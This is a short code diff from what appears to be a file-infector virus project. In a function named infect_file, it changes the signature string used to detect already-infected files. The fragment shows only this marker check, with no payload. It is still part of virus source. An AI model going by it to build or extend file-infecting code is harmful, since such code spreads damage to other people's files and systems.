@@ -125,7 +125,10 @@ infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
     if (fd < 0) return (1);
 
-    char *SIGNATURE = "abcde";
+    char SIGNATURE[10];
+    for (int i = 0; i < 10; i++)
+        SIGNATURE[i] = '0';
+    SIGNATURE[9] = 0;
 
     const uint8_t has_signature = ft_string_search_fd(fd, SIGNATURE);
     char one = '1';
